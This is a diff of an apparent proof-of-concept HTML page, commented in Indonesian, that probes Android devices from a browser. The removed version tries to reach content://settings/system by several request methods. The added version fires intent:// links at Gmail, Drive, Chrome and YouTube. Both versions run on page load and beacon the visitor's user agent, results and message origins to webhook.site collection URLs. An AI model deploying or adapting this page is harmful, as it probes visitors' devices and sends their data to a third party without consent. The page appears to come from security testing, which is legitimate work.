@@ -2,121 +2,60 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Fixed Probe</title>
+<title>Google Apps Multi-Target PoC</title>
 </head>
 <body>
-<h3>Probe Running (Fixed)...</h3>
+<h3>Testing Google Apps Intent:// & WebView</h3>
 
 <script>
-const CONFIG = {
-    TARGET: "content://settings/system",
-    CONTROL: "https://example.com/",
-    WEBHOOK: "https://webhook.site/cc134afb-98c9-4219-8ed2-5b7fae0eafc0"
-};
+const WEBHOOK = "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d";
 
-// 🔥 FIX: gunakan image beacon (lebih reliable)
-function report(data) {
-    const payload = btoa(JSON.stringify({
-        time: Date.now(),
-        ua: navigator.userAgent,
-        ...data
-    }));
-
+// Helper: lapor event ke server
+function report(app, action, status) {
     const img = new Image();
-    img.src = CONFIG.WEBHOOK + "?d=" + payload;
-
-    // fallback fetch (optional)
-    fetch(CONFIG.WEBHOOK, {
-        method: "POST",
-        mode: "no-cors",
-        body: payload
-    }).catch(()=>{});
+    img.src = WEBHOOK + "?app=" + encodeURIComponent(app) 
+                     + "&action=" + encodeURIComponent(action) 
+                     + "&status=" + encodeURIComponent(status);
+    console.log("Reported:", app, action, status);
 }
 
-// ========== XHR ==========
-function testXHR(url, label) {
-    const start = performance.now();
-    const xhr = new XMLHttpRequest();
-
-    xhr.open("GET", url, true);
-
-    xhr.onloadend = function() {
-        report({
-            type: "XHR",
-            label,
-            status: xhr.status,
-            duration: performance.now() - start
-        });
-    };
-
-    xhr.onerror = () => report({ type: "XHR_ERROR", label });
-
-    try { xhr.send(); }
-    catch(e) { report({ type: "XHR_EXCEPTION", label }); }
-}
-
-// ========== FETCH ==========
-async function testFetch(url, label) {
-    const start = performance.now();
-    try {
-        await fetch(url, { mode: "no-cors" });
-        report({
-            type: "FETCH_DONE",
-            label,
-            duration: performance.now() - start
-        });
-    } catch (e) {
-        report({ type: "FETCH_ERROR", label });
+// Daftar target apps & intent
+const targets = [
+    {
+        app: "Gmail",
+        intent: "intent://compose?to=test@example.com#Intent;scheme=mailto;package=com.google.android.gm;end"
+    },
+    {
+        app: "Drive",
+        intent: "intent://open?id=FILE_ID#Intent;scheme=https;package=com.google.android.apps.docs;end"
+    },
+    {
+        app: "Chrome",
+        intent: "intent://www.example.com#Intent;scheme=https;package=com.android.chrome;end"
+    },
+    {
+        app: "YouTube",
+        intent: "intent://watch?v=dQw4w9WgXcQ#Intent;scheme=https;package=com.google.android.youtube;end"
     }
-}
+];
 
-// ========== IFRAME ==========
-function testIframe(url, label) {
-    const iframe = document.createElement("iframe");
-    iframe.style.display = "none";
+// Coba trigger semua intents
+targets.forEach(target => {
+    try {
+        window.location.href = target.intent;
+        report(target.app, "intent_triggered", "attempted");
+    } catch(e) {
+        report(target.app, "intent_triggered", "error");
+    }
+});
 
-    let triggered = false;
+// Optional: WebView / postMessage safe test
+window.addEventListener("message", (evt) => {
+    report("AllApps", "postMessage_received", evt.origin);
+}, false);
 
-    iframe.onload = () => {
-        triggered = true;
-        report({ type: "IFRAME_LOAD", label });
-    };
-
-    setTimeout(() => {
-        if (!triggered) {
-            report({ type: "IFRAME_TIMEOUT", label });
-        }
-    }, 3000);
-
-    iframe.src = url;
-    document.body.appendChild(iframe);
-}
-
-// ========== IMAGE ==========
-function testImage(url, label) {
-    const img = new Image();
-
-    img.onload = () => report({ type: "IMG_LOAD", label });
-    img.onerror = () => report({ type: "IMG_ERROR", label });
-
-    img.src = url;
-}
-
-// ========== RUN ==========
-window.onload = () => {
-    const tests = [
-        [CONFIG.TARGET, "TARGET"],
-        [CONFIG.CONTROL, "CONTROL"]
-    ];
-
-    tests.forEach(([url, label]) => {
-        setTimeout(() => testXHR(url, label), 100);
-        setTimeout(() => testFetch(url, label), 300);
-        setTimeout(() => testIframe(url, label), 600);
-        setTimeout(() => testImage(url, label), 900);
-    });
-};
 </script>
 
+<p>Check your webhook to see which intents fired.</p>
 </body>
 </html>
